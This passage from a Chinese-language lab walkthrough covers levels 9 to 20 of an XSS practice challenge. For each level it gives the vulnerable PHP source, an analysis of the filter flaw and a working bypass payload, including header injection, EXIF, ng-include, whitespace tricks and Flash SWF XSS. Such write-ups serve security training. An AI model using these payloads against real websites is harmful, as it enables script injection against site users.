alt="1558248807926"></p><p>提示链接不合法，应该是验证了链接的格式，输入<code>http://</code> 能成功写入</p><p><img src="/2019/05/20/XSS挑战之旅/1558248919987.png" alt="1558248919987"></p><p>那就继续构造带 <code>http://</code> 的拼接语句</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">javascrip&amp;#116;:alert(/xss/)//http://</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558249256987.png" alt="1558249256987"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"scr_ipt"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">"on"</span>,<span class="string">"o_n"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"src"</span>,<span class="string">"sr_c"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">"data"</span>,<span class="string">"da_ta"</span>,$str4);</span><br><span class="line">$str6=str_replace(<span class="string">"href"</span>,<span class="string">"hr_ef"</span>,$str5);</span><br><span class="line">$str7=str_replace(<span class="string">'"'</span>,<span class="string">'&amp;quot'</span>,$str6);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form action=level9.php method=GET&gt;</span></span><br><span class="line"><span class="string">&lt;input name=keyword  value="'</span>.htmlspecialchars($str).<span class="string">'"&gt;</span></span><br><span class="line"><span class="string">&lt;input type=submit name=submit value=添加友情链接 /&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="keyword">if</span>(<span class="keyword">false</span>===strpos($str7,<span class="string">'http://'</span>))</span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="您的链接不合法？有没有！"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">        &#125;</span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">&#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">'&lt;center&gt;&lt;BR&gt;&lt;a href="'</span>.$str7.<span class="string">'"&gt;友情链接&lt;/a&gt;&lt;/center&gt;'</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>可以看出与level8的区别就在于多加了一个链接格式的判断，使用strpos()函数，查找<code>http://</code>出现的位置，但是改代码没有判断位置是否在开头，仅判断被查找的字符串即 <code>http://</code> 是否存在，所以可以在payload后面加上注释符和<code>http://</code>，即可成功绕过</p><h2 id="level10"><a href="#level10" class="headerlink" title="level10"></a>level10</h2><h3 id="隐藏GET传参"><a href="#隐藏GET传参" class="headerlink" title="隐藏GET传参"></a>隐藏GET传参</h3><p>这关发现一个隐藏的表单</p><p><img src="/2019/05/20/XSS挑战之旅/1558250497766.png" alt="1558250497766"></p><p>但是没有提交按钮和提交页面</p><p><img src="/2019/05/20/XSS挑战之旅/1558250601339.png" alt="1558250601339"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str11 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>发现GET参数<code>t_sort</code>会被过滤<code>&lt;&gt;</code>输出，所以可以使用事件属性进行构造利用</p><p>payload如下：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?t_sort=1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558251116826.png" alt="1558251116826"></p><h2 id="level11"><a href="#level11" class="headerlink" title="level11"></a>level11</h2><h3 id="Referer头插入"><a href="#Referer头插入" class="headerlink" title="Referer头插入"></a>Referer头插入</h3><p>隐藏表单多了一个<code>&lt;input&gt;</code></p><p><img src="/2019/05/20/XSS挑战之旅/1558251262671.png" alt="1558251262671"></p><p>把全部表单的值通过GET参数传递过去</p><p><img src="/2019/05/20/XSS挑战之旅/1558251563250.png" alt="1558251563250"></p><p><img src="/2019/05/20/XSS挑战之旅/1558251601685.png" alt="1558251601685"></p><p>只有t_sort接收了get传参，看起来双引号被转义掉了，尝试了单引号也不行，又尝试了POST传参也不行</p><p>查看源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_REFERER'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ref"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>和上一关的代码类似，但是<code>t_sort</code>的值经过了html实体化转义，所以无法在此处进行利用了。不过新的<code>t_ref</code>，的值是通过referer头获取的，可以抓包修改Referer头的内容，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">Referer: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558252521803.png" alt="1558252521803"></p><p>总结：</p><p>要注意细节，寻找提示信息，不放过任何一处我们提交的数据内容</p><h2 id="level12"><a href="#level12" class="headerlink" title="level12"></a>level12</h2><h3 id="UA头插入"><a href="#UA头插入" class="headerlink" title="UA头插入"></a>UA头插入</h3><p>在页面源码中发现User-Agent信息</p><p><img src="/2019/05/20/XSS挑战之旅/1558252884442.png" alt="1558252884442"></p><p>修改UA头部信息</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">User-Agent: 1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558253045262.png" alt="1558253045262"></p><p><img src="/2019/05/20/XSS挑战之旅/1558253074469.png" alt="1558253074469"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_SERVER[<span class="string">'HTTP_USER_AGENT'</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_ua"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟上一关一样，区别就在于获取的请求头部信息变成了<code>User-Agent</code>，所以只需要抓包修改UA的内容即可</p><h2 id="level13"><a href="#level13" class="headerlink" title="level13"></a>level13</h2><h3 id="Cookie插入"><a href="#Cookie插入" class="headerlink" title="Cookie插入"></a>Cookie插入</h3><p>注意到cookie参数</p><p><img src="/2019/05/20/XSS挑战之旅/1558253383778.png" alt="1558253383778"></p><p>查看cookie内容</p><p><img src="/2019/05/20/XSS挑战之旅/1558253574394.png" alt="1558253574394"></p><p>修改cookie，插入payload</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">1&quot; onmouseover=&quot;alert(1)&quot; type=&quot;text&quot;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558253654942.png" alt="1558253654942"></p><p>成功触发XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">setcookie(<span class="string">"user"</span>, <span class="string">"call me maybe?"</span>, time()+<span class="number">3600</span>);</span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"keyword"</span>];</span><br><span class="line">$str00 = $_GET[<span class="string">"t_sort"</span>];</span><br><span class="line">$str11=$_COOKIE[<span class="string">"user"</span>];</span><br><span class="line">$str22=str_replace(<span class="string">"&gt;"</span>,<span class="string">""</span>,$str11);</span><br><span class="line">$str33=str_replace(<span class="string">"&lt;"</span>,<span class="string">""</span>,$str22);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;h2 align=center&gt;没有找到和"</span>.htmlspecialchars($str).<span class="string">"相关的结果.&lt;/h2&gt;"</span>.<span class="string">'&lt;center&gt;</span></span><br><span class="line"><span class="string">&lt;form id=search&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_link"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_history"  value="'</span>.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_sort"  value="'</span>.htmlspecialchars($str00).<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;input name="t_cook"  value="'</span>.$str33.<span class="string">'" type="hidden"&gt;</span></span><br><span class="line"><span class="string">&lt;/form&gt;</span></span><br><span class="line"><span class="string">&lt;/center&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>跟之前一样，区别就在于获取的请求头部信息换成了获取cookie中的<code>user</code>的值，所以把cookie中user的值里插入payload即可</p><h2 id="level14"><a href="#level14" class="headerlink" title="level14"></a>level14</h2><h3 id="exif-xss"><a href="#exif-xss" class="headerlink" title="exif xss"></a>exif xss</h3><p>这关使用<code>&lt;iframe&gt;</code>嵌入了一个小网页（注意：需要访问到<code>外网</code>才能访问）</p><p><img src="/2019/05/20/XSS挑战之旅/1558254716646.png" alt="1558254716646"></p><p>发现搜索框有输出点</p><p><img src="/2019/05/20/XSS挑战之旅/1558254944255.png" alt="1558254944255"></p><p>尝试闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558255107617.png" alt="1558255107617"></p><p><img src="/2019/05/20/XSS挑战之旅/1558255149283.png" alt="1558255149283"></p><p>&lt;&gt;被转义掉了，感觉这里不存在可利用的点了。</p><p>看下源码：</p><figure class="highlight html"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="tag">&lt;<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">iframe</span> <span class="attr">name</span>=<span class="string">"leftframe"</span> <span class="attr">marginwidth</span>=<span class="string">10</span> <span class="attr">marginheight</span>=<span class="string">10</span> <span class="attr">src</span>=<span class="string">"http://www.exifviewer.org/"</span> <span class="attr">frameborder</span>=<span class="string">no</span> <span class="attr">width</span>=<span class="string">"80%"</span> <span class="attr">scrolling</span>=<span class="string">"no"</span> <span class="attr">height</span>=<span class="string">80%</span>&gt;</span><span class="tag">&lt;/<span class="name">iframe</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span><span class="tag">&lt;<span class="name">center</span>&gt;</span>这关成功后不会自动跳转。成功者<span class="tag">&lt;<span class="name">a</span> <span class="attr">href</span>=<span class="string">/xsschallenge/level15.php?src</span>=<span class="string">1.gif</span>&gt;</span>点我进level15<span class="tag">&lt;/<span class="name">a</span>&gt;</span><span class="tag">&lt;/<span class="name">center</span>&gt;</span></span><br></pre></td></tr></table></figure><p>只有一个iframe标签引用了<a href="http://exofvoewer.org/" target="_blank" rel="noopener">http://exofvoewer.org</a>，最后看了下<a href="https://xz.aliyun.com/t/1206?accounttraceid=74ab404d-2a01-4a1c-8b87-36ad367dbe11#toc-12" target="_blank" rel="noopener">先知上的wp</a>，了解到这关考察的是exif xss，漏洞原理是通过修改图片的exif信息，造成解析图片exif触发XSS。</p><p><img src="/2019/05/20/XSS挑战之旅/1558360067701.png" alt="1558360067701"></p><p>payload：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&apos; &quot;&gt;&lt;img src=x onerror=alert(1)&gt;//</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558358694058.png" alt="1558358694058"></p><h2 id="level15"><a href="#level15" class="headerlink" title="level15"></a>level15</h2><h3 id="文件包含插入"><a href="#文件包含插入" class="headerlink" title="文件包含插入"></a>文件包含插入</h3><p><img src="/2019/05/20/XSS挑战之旅/1558265228176.png" alt="1558265228176"></p><p>先试了一下闭合标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558266783744.png" alt="1558266783744"></p><p><code>&lt;&gt;</code>被转义掉了，再试一下事件属性</p><p><img src="/2019/05/20/XSS挑战之旅/1558266984431.png" alt="1558266984431"></p><p>双引号也被转义掉了，一时没了思路，看了下网上的文章，说是要注意下面这里</p><p><img src="/2019/05/20/XSS挑战之旅/1558267117962.png" alt="1558267117962"></p><p>上网查了一下相关知识</p><p><img src="/2019/05/20/XSS挑战之旅/1558265795045.png" alt="1558265795045"></p><p>发现ng-include可以利用，因为不能跨域，所以包含一个前面的关卡，<code>&lt;script&gt;</code>没有成功，使用<code>&lt;img&gt;</code>成功触发</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">level15.php?src=&apos;level1.php?name=&lt;/h2&gt;&lt;img src=x onerror=&quot;alert(1)&quot;&gt;&lt;h2&gt;&apos;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558266253831.png" alt="1558266253831"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = $_GET[<span class="string">"src"</span>];</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;body&gt;&lt;span class="ng-include:'</span>.htmlspecialchars($str).<span class="string">'"&gt;&lt;/span&gt;&lt;/body&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>此处只有一个输出点，被实体化转义过了，也不是单引号闭合，所以无法逃逸，只能从<code>ng-include</code>处入手了。</p><p>还有一点疑问，我们的payload明明被实体化转义掉了，为什么还可以再原样输出回来呢？</p><p>总结：</p><p>发现不一样，不了解的点时，多去查查相关资料，不能错过知识点外的机会。</p><h2 id="level16"><a href="#level16" class="headerlink" title="level16"></a>level16</h2><h3 id="空格字符绕过"><a href="#空格字符绕过" class="headerlink" title="空格字符绕过"></a>空格字符绕过</h3><p><img src="/2019/05/20/XSS挑战之旅/1558267796468.png" alt="1558267796468"></p><p>尝试<code>&lt;script&gt;</code>标签</p><p><img src="/2019/05/20/XSS挑战之旅/1558268014317.png" alt="1558268014317"></p><p><code>script</code> 和 <code>/</code> 替换为空，试一下<code>svg</code></p><p><img src="/2019/05/20/XSS挑战之旅/1558268343632.png" alt="1558268343632">发现只有空格被过滤掉，使用<code>%0a</code> <code>%0d</code>做分隔符</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?keyword=&lt;svg%0aonload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br><span class="line">?keyword=&lt;svg%0donload=&quot;alert(1);&quot;&gt;&lt;center&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558268510194.png" alt="1558268510194"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span> </span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line">$str = strtolower($_GET[<span class="string">"keyword"</span>]);</span><br><span class="line">$str2=str_replace(<span class="string">"script"</span>,<span class="string">"&amp;nbsp;"</span>,$str);</span><br><span class="line">$str3=str_replace(<span class="string">" "</span>,<span class="string">"&amp;nbsp;"</span>,$str2);</span><br><span class="line">$str4=str_replace(<span class="string">"/"</span>,<span class="string">"&amp;nbsp;"</span>,$str3);</span><br><span class="line">$str5=str_replace(<span class="string">""</span>,<span class="string">"&amp;nbsp;"</span>,$str4);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;center&gt;"</span>.$str5.<span class="string">"&lt;/center&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>只是对空格，<code>script</code>，<code>/</code> 进行了过滤，不使用<code>script</code>，并且用其他方式代替空格即可成功绕过。</p><h2 id="level17"><a href="#level17" class="headerlink" title="level17"></a>level17</h2><h3 id="属性空格逃逸"><a href="#属性空格逃逸" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p><img src="/2019/05/20/XSS挑战之旅/1558273349908.png" alt="1558273349908"></p><p>可以看到可控的参数有两个，试一下标签逃逸</p><p><img src="/2019/05/20/XSS挑战之旅/1558273500807.png" alt="1558273500807"></p><p><code>&lt;&gt;</code>，<code>&quot;</code>被过滤，最后试出来个哈哈</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onclick=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558273987115.png" alt="1558273987115"></p><p>那这样应该也能行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=a&amp;arg02=b onmouseover=alert(1)</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558274123391.png" alt="1558274123391"></p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf01.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：</p><p>虽然参数都加上了实体化转义，但是没有引号闭合属性，所以添加空格就可以写个新属性啦哈哈</p><h2 id="level18"><a href="#level18" class="headerlink" title="level18"></a>level18</h2><h3 id="属性空格逃逸-1"><a href="#属性空格逃逸-1" class="headerlink" title="属性空格逃逸"></a>属性空格逃逸</h3><p>Excuse me ???，上把的payload都没变</p><p><img src="/2019/05/20/XSS挑战之旅/1558274541848.png" alt="1558274541848"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">"&lt;embed src=xsf02.swf?"</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">" width=100% heigth=100%&gt;"</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>我瞅了半天，才发现只是引用的swf文件名不一样。。好吧，下一关</p><h2 id="level19"><a href="#level19" class="headerlink" title="level19"></a>level19</h2><h3 id="Flash-XSS"><a href="#Flash-XSS" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这关试了怎么试都跳不出了属性的值</p><p><img src="/2019/05/20/XSS挑战之旅/1558313314215.png" alt="1558313314215"></p><p>看一下源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf03.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>分析：这里和上两关</p><p>的区别就在于有了双引号来闭合属性的值，又因为使用了实体化转义的函数，双引号无法逃脱出去。所以这关考察的应该是Flash XSS，参考了<a href="https://www.jianshu.com/u/0d74cafbe972" target="_blank" rel="noopener">D4rk3r</a>这位大佬的文章</p><p>使用工具<a href="https://github.com/jindrapetrik/jpexs-decompiler" target="_blank" rel="noopener">jpexs-decompiler</a></p><p>首先找到getURL函数</p><p><img src="/2019/05/20/XSS挑战之旅/1558315194981.png" alt="1558315194981"></p><p>然后发现了version参数会被传入loc4变量中，即sIFR的内容中</p><p><img src="/2019/05/20/XSS挑战之旅/1558315623256.png" alt="1558315623256"></p><p>但是根据第一张图中getURL只在内容为link时打开，所以再看下contentIsLink()函数</p><p><img src="/2019/05/20/XSS挑战之旅/1558316052078.png" alt="1558316052078"></p><p>得知构造<code>&lt;a&gt;&lt;/a&gt;</code>标签来传值</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">?arg01=version&amp;arg02=&lt;a href=&quot;javascript:alert(1)&quot;&gt;123&lt;/a&gt;</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558316206643.png" alt="1558316206643"></p><p>注意：我的火狐浏览器加载不出来flash，这里用的chrome可以加载</p><h2 id="level20"><a href="#level20" class="headerlink" title="level20"></a>level20</h2><h3 id="Flash-XSS-1"><a href="#Flash-XSS-1" class="headerlink" title="Flash XSS"></a>Flash XSS</h3><p>这一关和上关一样，考察Flash XSS</p><p>源码：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">ini_set(<span class="string">"display_errors"</span>, <span class="number">0</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="string">'&lt;embed src="xsf04.swf?'</span>.htmlspecialchars($_GET[<span class="string">"arg01"</span>]).<span class="string">"="</span>.htmlspecialchars($_GET[<span class="string">"arg02"</span>]).<span class="string">'" width=100% heigth=100%&gt;'</span>;</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>网上说是<strong>zeroclipboard.swf</strong> 的XSS，其主要的功能是复制内容到剪切板，中间由flash进行中转保证兼容主流浏览器，具体做法就是使这个透明的flash漂浮在复制按钮之上，下面给出xss poc代码：</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?arg01=id</span><br><span class="line">&amp;arg02=\%22))&#125;catch(e)&#123;&#125;if(!self.a)self.a=!alert(1)//%26width%26height</span><br></pre></td></tr></table></figure><p><img src="/2019/05/20/XSS挑战之旅/1558343919410.png" alt="1558343919410"></p><p>看一下flash代码，看不懂了 (￣_￣|||)，就先记录一下payload吧。</p><h2 id="参考文章："><a href="#参考文章：" class="headerlink" title="参考文章："></a>参考文章：</h2><p><a href="https://www.smi1e.top/xss-payload/" target="_blank" 